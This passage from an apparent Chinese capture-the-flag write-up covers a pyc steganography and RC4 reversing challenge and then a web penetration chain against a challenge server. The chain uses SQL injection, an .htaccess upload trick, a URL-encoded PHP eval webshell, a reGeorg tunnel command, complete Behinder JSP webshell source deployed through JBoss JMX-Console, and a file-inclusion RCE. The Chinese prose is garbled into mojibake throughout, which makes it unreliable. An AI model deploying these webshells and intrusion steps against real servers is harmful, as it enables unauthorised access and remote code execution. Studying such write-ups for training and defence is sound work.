01 74 02 64 01 83 01 83 01 7d 02 64 02 7d 03 74 02 64 01 83 01 44 00 5d 1d 7d 04 7c 03 7c 02 7c 04 19 00 17 00 7c 00 7c 04 7c 01 16 00 19 00 17 00 64 01 16 00 7d 03 7c 02 7c 03 19 00 7c 02 7c 04 19 00 02 00 7c 02 7c 04 3c 00 7c 02 7c 03 3c 00 71 10 7c 02 53 00 29 03 4e e9 00 01 00 00 72 01 00 00 00 29 03 da 03 6c 65 6e da 04 6c 69 73 74 da 05 72 61 6e 67 65 29 05 da 03 6b 65 79 da 09 6b 65 79 6c 65 6e 67 74 68 da 01 53 da 01 6a da 01 69 a9 00 72 0d 00 00 00 fa 07 6d 61 69 6e 2e 70 79 da 03 4b 53 41 06 00 00 00 73 0e 00 00 00 00 01 08 01 0c 01 04 01 0c 01 1c 01 1c 01 72 0f 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 04 00 00 00 63 00 00 00 73 62 00 00 00 81 00 64 01 7d 01 64 01 7d 02 09 f0 7c 01 64 03 17 b4 64 04 16 55 7d 01 7c 02 7c 00 7c 01 19 16 17 36 64 04 16 c5 7d 02 7c 00 7c 02 19 6f 7c 00 7c 01 19 db 02 c9 7c 00 7c 01 3c ea 7c 00 7c 02 3c 64 7c 00 7c 00 7c 01 19 04 7c 00 7c 02 19 15 17 62 64 04 16 00 19 00 7d 03 7c 03 56 00 01 00 71 06 29 05 4e 72 01 00 00 00 54 e9 01 00 00 00 72 04 00 00 00 72 0d 00 00 00 29 04 72 0a 00 00 00 72 0c 00 00 00 72 0b 00 00 00 da 01 4b 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 04 50 52 47 41 10 00 00 00 73 12 00 00 00 02 01 04 01 04 01 02 01 0c 01 10 01 1a 01 18 01 06 fb 72 12 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 02 00 00 00 43 00 00 00 73 10 00 00 00 74 00 7c 00 83 01 7d 01 74 01 7c 01 83 01 53 11 29 01 4e 29 02 72 0f 00 00 00 72 12 00 00 00 29 02 72 08 00 00 00 72 0a 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 03 52 43 34 1a 00 00 00 73 04 00 00 00 00 01 08 01 72 13 00 00 00 63 02 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 05 00 00 00 03 00 00 00 73 16 00 00 00 74 00 74 01 87 00 66 01 64 01 64 02 84 08 7c 00 83 02 83 01 53 a2 29 03 4e 63 01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 03 00 00 00 13 00 00 00 73 0c 00 00 00 7c 00 88 00 a0 00 a1 00 41 b0 53 cd 29 01 4e 29 01 da 08 5f 5f 6e 65 78 74 5f 5f 29 01 da 01 78 29 01 da 06 73 74 72 65 61 6d 72 0d 00 00 00 72 0e 00 00 00 da 08 3c 6c 61 6d 62 64 61 3e 1f 00 00 00 f3 00 00 00 00 fa 15 78 6f 72 2e 3c 6c 6f 63 61 6c 73 3e 2e 3c 6c 61 6d 62 64 61 3e 29 02 da 05 62 79 74 65 73 da 03 6d 61 70 29 02 da 01 70 72 16 00 00 00 72 0d 00 00 00 29 01 72 16 00 00 00 72 0e 00 00 00 da 03 78 6f 72 1e 00 00 00 73 02 00 00 00 00 01 72 1d 00 00 00 da 08 5f 5f 6d 61 69 6e 5f 5f f3 1c 00 00 00 f6 ef 10 48 a9 0f 9f b5 80 c1 78 64 ae d3 03 b2 84 c2 b4 0e c8 f3 3c 15 31 19 0a 8f f3 0e 00 00 00 24 0d 39 a3 18 dd 57 c9 97 f3 a7 a8 52 7e f3 03 00 00 00 67 65 6f f3 20 00 00 00 7d ce 60 be 6a a2 12 30 b5 8a 94 14 7b a3 86 c8 c7 01 98 a3 5f 91 d8 82 54 2a 56 ab e0 a1 14 31 f3 34 00 00 00 51 5f e2 f8 8c 11 4d 7d 27 3c 40 ce 54 f6 3f 5f 6d a4 f8 b4 ea ca c7 3a b9 e6 06 8b eb fa 62 48 85 78 4a 33 24 dd de b6 dc a0 b8 62 96 31 b7 13 3d 17 13 b1 e9 73 00 00 00 e9 61 00 00 00 e9 75 00 00 00 e9 72 00 00 00 a9 04 e9 02 00 00 00 e9 08 00 00 00 e9 0b 00 00 00 e9 0a 00 00 00 e9 77 00 00 00 e9 74 00 00 00 e9 7c 00 00 00 e9 7f 00 00 00 a9 04 e9 03 00 00 00 e9 07 00 00 00 e9 09 00 00 00 e9 0c 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 06 00 00 00 43 00 00 00 73 1a 00 00 00 69 00 7c 00 5d 09 7d 01 7c 01 7c 01 74 00 7c 01 19 f0 41 7d 93 02 71 02 53 49 72 0d 00 00 00 29 01 da 01 6e 29 02 da 02 2e 30 72 15 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 0a 3c 64 69 63 74 63 6f 6d 70 3e 2c 00 00 00 72 18 00 00 00 72 38 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 03 00 00 00 63 00 00 00 73 1c 00 00 00 81 00 7c 00 5d 09 7d 01 7c 01 a0 00 a1 00 7c 01 66 02 56 32 01 d6 71 02 64 00 53 22 29 01 4e 29 01 da 09 62 69 74 5f 63 6f 75 6e 74 29 02 72 37 00 00 00 72 0c 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 09 3c 67 65 6e 65 78 70 72 3e 2d 00 00 00 72 18 00 00 00 72 3a 00 00 00 63 01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 02 00 00 00 43 00 00 00 73 08 00 00 00 7c 00 64 01 19 e5 53 0a 29 02 4e 72 10 00 00 00 72 0d 00 00 00 29 01 72 15 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 72 17 00 00 00 2f 00 00 00 72 18 00 00 00 72 17 00 00 00 29 1c da 03 73 79 73 da 07 68 61 73 68 6c 69 62 72 03 00 00 00 72 0f 00 00 00 72 12 00 00 00 72 13 00 00 00 72 1d 00 00 00 da 08 5f 5f 6e 61 6d 65 5f 5f da 01 77 da 01 65 da 01 62 da 01 73 da 01 74 da 01 6d 72 36 00 00 00 72 06 00 00 00 72 1b 00 00 00 da 06 73 6f 72 74 65 64 da 05 69 74 65 6d 73 72 16 00 00 00 da 05 70 72 69 6e 74 da 06 64 65 63 6f 64 65 da 05 73 74 64 69 6e da 06 62 75 66 66 65 72 da 04 72 65 61 64 72 1c 00 00 00 da 01 63 da 06 64 69 67 65 73 74 72 0d 00 00 00 72 0d 00 00 00 72 0d 00 00 00 72 0e 00 00 00 da 08 3c 6d 6f 64 75 6c 65 3e 01 00 00 00 73 32 00 00 00 00 02 08 01 0c 02 08 0a 08 0a 08 04 08 03 08 01 04 01 04 03 04 01 04 02 04 01 0e 01 0e 01 12 01 12 02 1e 01 12 01 0c 01 0a 02 0a 01 10 01 16 02 10 e9 </span><br></pre></td></tr></table></figure><p>å°†å…¶è½¬ä¸ºåå…­è¿›åˆ¶åå­˜å‚¨ä¸ºæ–‡ä»¶å¯å¾—ä¸€ä¸ª Python 3.10 çš„ pyc æ–‡ä»¶ã€‚ä½¿ç”¨ stegosaurus è§£éšå†™å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚æ­¤æ—¶éœ€è¦ä¿®æ”¹  stegosaurus å·¥å…·çš„æºç ï¼Œå°† <code>payload = str(payloadBytes, &quot;utf8&quot;)</code> ä¿®æ”¹ä½œ <code>payload = payloadBytes</code> æ‰èƒ½å¾—åˆ°æ— æ³•è§£ç çš„å­—èŠ‚è½½è·ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Extracted payload: bytearray(b&#39;\xe5\n2\xd6&quot;\xf0&#125;I\xb0\xcd\xa2\x11\xf0\xb4U\x166\xc5o\xdb\xc9\xead\x04\x15b&#39;)</span><br></pre></td></tr></table></figure><p>å†™è„šæœ¬å¯ä»¥å°† pyc è½¬æ¢æˆå­—èŠ‚ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;extracted.pyc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.seek(<span class="number">16</span>)</span><br><span class="line">  dis.dis(marshal.load(f))</span><br></pre></td></tr></table></figure><p>å°†å­—èŠ‚ç æ‰‹åŠ¨è½¬è¯‘æˆ Python ä»£ç å¹¶å°†è§£éšå†™å¾—åˆ°çš„å†…å®¹æ·»åŠ è¿›å»ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">KSA</span>(<span class="params">key</span>):</span></span><br><span class="line">    keylength = <span class="built_in">len</span>(key)</span><br><span class="line">    S=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j=((j + S[i]) + key[i % keylength]) % <span class="number">256</span></span><br><span class="line">        S[j],S[i]=S[i],S[j]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PRGA</span>(<span class="params">S</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[j],S[i]=S[i],S[j]</span><br><span class="line">        K=S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        <span class="keyword">yield</span> K</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RC4</span>(<span class="params">key</span>):</span></span><br><span class="line">    S=KSA(key)</span><br><span class="line">    <span class="keyword">return</span> PRGA(S)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">p,stream</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:(x ^ stream.__next__()), p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    w=<span class="string">b&#x27;\xf6\xef\x10H\xa9\x0f\x9f\xb5\x80\xc1xd\xae\xd3\x03\xb2\x84\xc2\xb4\x0e\xc8\xf3&lt;\x151\x19\n\x8f&#x27;</span></span><br><span class="line">    e=<span class="string">b&#x27;$\r9\xa3\x18\xddW\xc9\x97\xf3\xa7\xa8R~&#x27;</span></span><br><span class="line">    b=<span class="string">b&#x27;geo&#x27;</span></span><br><span class="line">    s=<span class="string">b&#x27;&#125;\xce`\xbej\xa2\x120\xb5\x8a\x94\x14&#123;\xa3\x86\xc8\xc7\x01\x98\xa3_\x91\xd8\x82T*V\xab\xe0\xa1\x141&#x27;</span></span><br><span class="line">    t=<span class="string">b&quot;Q_\xe2\xf8\x8c\x11M&#125;&#x27;&lt;@\xceT\xf6?_m\xa4\xf8\xb4\xea\xca\xc7:\xb9\xe6\x06\x8b\xeb\xfabH\x85xJ3$\xdd\xde\xb6\xdc\xa0\xb8b\x961\xb7\x13=\x17\x13\xb1&quot;</span></span><br><span class="line">    m=&#123;<span class="number">2</span>:<span class="number">115</span> ,<span class="number">8</span>:<span class="number">97</span>, <span class="number">11</span>:<span class="number">117</span>, <span class="number">10</span>:<span class="number">114</span>&#125;</span><br><span class="line">    n=&#123;<span class="number">3</span>:<span class="number">119</span>, <span class="number">7</span>:<span class="number">116</span>, <span class="number">9</span>:<span class="number">124</span>, <span class="number">12</span>:<span class="number">127</span>&#125;</span><br><span class="line">    m|=&#123;x:x^n[x]<span class="keyword">for</span> x <span class="keyword">in</span> n&#125;  </span><br><span class="line">    m|=((i.bit_count(),i) <span class="keyword">for</span> i <span class="keyword">in</span> b)</span><br><span class="line">    stream=RC4(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x:x[<span class="number">1</span>],<span class="built_in">sorted</span>(m.items())))) </span><br><span class="line">    <span class="built_in">print</span> (stream)</span><br><span class="line">    <span class="built_in">print</span>(xor(w,stream).decode())</span><br><span class="line">    <span class="comment">#p=sys.stdin.buffer.read()</span></span><br><span class="line">    p=<span class="string">b&#x27;\xe5\n2\xd6&quot;\xf0&#125;I\xb0\xcd\xa2\x11\xf0\xb4U\x166\xc5o\xdb\xc9\xead\x04\x15b&#x27;</span></span><br><span class="line">    e=xor(e,stream)</span><br><span class="line">    c=xor(p,stream)</span><br><span class="line">    <span class="built_in">print</span> (c)</span><br><span class="line">    <span class="keyword">if</span> sha256(c).digest() == s:</span><br><span class="line">        <span class="built_in">print</span>(xor(t,stream).decode())</span><br><span class="line">    <span class="built_in">print</span>(e.decode())</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;generator object PRGA at 0x000001D8EACA83C0&gt;</span><br><span class="line">Give me the mystery string :</span><br><span class="line">b&#39;flag&#123;P0w5rFu1_0pEn_50urcE&#125;&#39;</span><br><span class="line">Congratulations! Now you should now what the flag is</span><br><span class="line">You are wrong!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;P0w5rFu1_0pEn_50urcE&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h3><p>åœ¨é¡µé¢æºç ä¸­å¯è§å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /hint --&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—® <code>/hint</code> è·¯ç”±å¯å¾—å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;hint&quot;</span>:<span class="string">&quot;# hint ^_^\n\tSo~ How to get files in this server? \n\tfiles/????????????????????????????????&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>/files</code> è·¯ç”±ï¼Œä¸‹è½½æ–‡ä»¶å¯å¾—å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Try to scan 35000-40000 ^_^.</span><br><span class="line">All tables are empty except for the table where the username and password are located</span><br><span class="line">Table: employee</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ nmap è¿›è¡Œç«¯å£æ‰«æï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç«¯å£å¼€æ”¾ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host is up (0.094s latency).</span><br><span class="line">Not shown: 5000 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">36842&#x2F;tcp open  unknown</span><br></pre></td></tr></table></figure><p>è®¿é—® 36842 ç«¯å£å¯å¾—ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œç¨å¾®å°è¯•å¯å¾— SQL æ³¨å…¥ç‚¹ã€‚æ ¹æ®æç¤ºçˆ†å‡ºè´¦å· <code>admin</code>ï¼Œå¯†ç  <code>99f609527226e076d668668582ac4420</code>ã€‚</p><p>æ‰«æå¯å¾— <code>/file</code> è·¯ç”±ï¼Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œå°è¯•ä¸Šä¼ ä¸€ä¸ª <code>.htaccess</code> å°† txt æ–‡ä»¶</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addhandler php5-script .txt</span><br></pre></td></tr></table></figure><p>å°†å…¶ä¸Šä¼ åå†å°è¯•ä¸Šä¼  PHP æ–‡ä»¶ã€‚å­˜åœ¨å±é™©å­—ç¬¦æ£€æµ‹ï¼Œå› æ­¤é‡‡ç”¨è§¦å‘å†™å…¥ï¼Œå°†å†…å®¹å®Œå…¨ URL Encodeï¼Œæ„é€ ä¸Šä¼ è½½è·å¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">&quot;this.txt&quot;</span>,urldecode(<span class="string">&quot;%3c%3f%70%68%70%20%65%76%61%6c%28%22%24%5f%50%4f%53%54%5b%31%5d%22%29%3b&quot;</span>));</span><br></pre></td></tr></table></figure><p>å°†å…¶ä¸Šä¼ åè®¿é—® <code>/upload/1d929bafc144014d7e7df7fe817232e4/info.txt</code> å³å¯å¾—åˆ°ä¸€ä¸ª shellã€‚ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œå‘ç°æ²¡æœ‰æƒé™è¯»å– flagã€‚ä½¿ç”¨æ’ä»¶æ‰«æå†…ç½‘ç«¯å£å¯å¾— 8006 ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623577753006/013752c36527cc823be3a7265965b1f1a80580b8.png" alt="image-20210613174909763"></p><p>ä¸Šä¼  reGeorg çš„ <code>tunnel.nosocket.php</code> å°†å†…ç½‘ç«¯å£ä»£ç†å‡ºæ¥ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -l 0.0.0.0 -p 3333 -u http:&#x2F;&#x2F;121.42.242.238:36842&#x2F;upload&#x2F;382f1b9e4a7b75dbeb05a3c4ed2fab04&#x2F;tunnel.nosocket.php -k a</span><br></pre></td></tr></table></figure><p>è®¿é—® localhost:8006 å¯ä»¥å‘ç°å­˜åœ¨ Jbossï¼Œé‡‡ç”¨ JMX-Console æœªæˆæƒè®¿é—®è¿›è¡Œæ”»å‡»ã€‚ä½¿ç”¨å†°èçš„ jsp ä¸€å¥è¯ç”Ÿæˆæ–°çš„ war åŒ…ã€‚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/</span>session.putValue(<span class="string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf zfsn.war shell.jsp</span><br></pre></td></tr></table></figure><p>å°†å¾—åˆ°çš„åŒ…ä¸Šä¼ åˆ°å¯è®¿é—®çš„è·¯å¾„ä¸‹è·å–ç½‘å€ï¼Œä½¿ç”¨ jboss.deployment çš„ addUrl å°† war åŒ…åŠ è½½è¿›å»ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623592411437/37dc593e6dac7b21d484e82a8ed9634f2aa68485.png" alt="image-20210613215325841"></p><p> ä½¿ç”¨å†°èè¿æ¥å¦‚ä¸‹é“¾æ¥ï¼Œå³å¯åœ¨æ–‡ä»¶ç®¡ç†ä¸­è¯»å–åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8006&#x2F;zfsn&#x2F;shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623579630730/dbc0f7bd1357dc91baddc621cc7de517a2fe9b7b.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3&#125;</span><br></pre></td></tr></table></figure><h3 id="Hard-Penetration"><a href="#Hard-Penetration" class="headerlink" title="Hard_Penetration"></a>Hard_Penetration</h3><p>ä½¿ç”¨ shiro_attack 2.0 å¯¹ <code>/login</code> è·¯ç”±è¿›è¡Œæ”»å‡»ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623603081793/f84813bafbb79f7380b76a8063202855ae8167f4.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623603059172/73cc69b5a12c5122d7c82d202d9e51cba4ff131e.png"></p><p>ä½¿ç”¨è¯¥å·¥å…·å¯¹ /login æ³¨å…¥å†°èçš„ jsp æœ¨é©¬å¹¶ä½¿ç”¨å†°èè¿æ¥ã€‚ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‘ç° flag æ— æ³•ç›´æ¥è¯»å–ï¼Œä½†æ˜¯ apache çš„é…ç½®ä¸‹å­˜åœ¨ 8005 çš„å¼€æ”¾ç«¯å£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623605614654/262e52533fac643ae85ab8994772c9c0c7e01ff0.png"></p><p>ç”±äº <code>/var/www/html</code> æ— æƒè®¿é—®ï¼Œå› æ­¤å°è¯•ä½¿ç”¨ç«¯å£æ˜ å°„å°†æœåŠ¡ä»£ç†å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623605772667/aec1a87c96ce157d075ce1f7d05f9ae8a4b26d1c.png"></p><p>æ ¹æ®ç½‘ç«™ä¸Šçš„æ–‡å­—çŒœæµ‹æ˜¯ BAOCMSï¼Œåœ¨ GitHub ä¸Šæ‰¾åˆ°ç±»ä¼¼çš„æºç è¿›è¡Œå®¡è®¡ã€‚å¯ä»¥å‘ç°åœ¨ <code>Delivery/Common/display</code> ä¸‹å­˜åœ¨æ–‡ä»¶åŒ…å«ã€‚display ä¸­è°ƒç”¨åˆ°çš„ parseTemplate æ–¹æ³•ç›´æ¥è¿”å›äº†å¤„ç†è¿‡çš„æ–‡ä»¶åï¼Œç”± display å€Ÿç”± fetch ç›´æ¥ include è¿›åˆ°é¡µé¢ä¸­ï¼Œå› æ­¤å‡ä½¿æ¨¡æ¿æ–‡ä»¶æ˜¯ PHP ä»£ç ï¼Œå…¶äº¦å¯æˆåŠŸæ‰§è¡Œã€‚å› æ­¤ï¼Œä¸Šä¼ ä¸€ä¸ªåŒ…å« <code>&lt;?php system(&quot;cat /flag&quot;);</code> çš„ html æ–‡ä»¶ï¼Œå†è¯·æ±‚åˆ°è¿™ä¸ªè·¯ç”±ç›´æ¥å°†å…¶åŒ…å«å³å¯ RCEã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦è·å¾—æœ‰æ•ˆçš„ uid æ‰èƒ½è¿›è¡Œæ“ä½œï¼Œåœ¨ common.php ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUid</span>(<span class="params"><span class="variable">$uid</span>=<span class="number">1</span></span>)</span>&#123; <span class="comment">//å›ºå®š uid ä¸º 1ï¼Œæ–¹ä¾¿è°ƒè¯•è·å–å¯¹åº” cookie</span></span><br><span class="line">    import(<span class="string">&quot;ORG/Crypt/Base64&quot;</span>);</span><br><span class="line">    <span class="variable">$uid</span> = <span class="string">&#x27;USER_&#x27;</span>.<span class="variable">$uid</span>.<span class="string">&#x27;_&#x27;</span>.NOW_TIME;</span><br><span class="line">    <span class="variable">$uid</span> = Base64::encrypt(<span class="variable">$uid</span>, C(<span class="string">&#x27;AUTH_KEY&#x27;</span>));</span><br><span class="line">    cookie(<span class="string">&#x27;Tudou_TOKEN&#x27;</span>,<span class="variable">$uid</span>,<span class="number">86400</span> * <span class="number">365</span>); <span class="comment">//å­˜2å°æ—¶</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUid</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    import(<span class="string">&quot;ORG/Crypt/Base64&quot;</span>);</span><br><span class="line">    <span class="variable">$token</span> = cookie(<span class="string">&#x27;Tudou_TOKEN&#x27;</span>);</span><br><span class="line">    <span class="variable">$token</span> = Base64::decrypt(<span class="variable">$token</span>, C(<span class="string">&#x27;AUTH_KEY&#x27;</span>));</span><br><span class="line">    <span class="variable">$token</span> = explode(<span class="string">&#x27;_&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">    setUid(); <span class="comment">//åœ¨æ­¤å¤„æ·»åŠ ä¸€è¡Œä»£ç ï¼Œæ–¹ä¾¿è°ƒè¯•è·å– cookie</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>[<span class="number">0</span>]!= <span class="string">&#x27;USER&#x27;</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 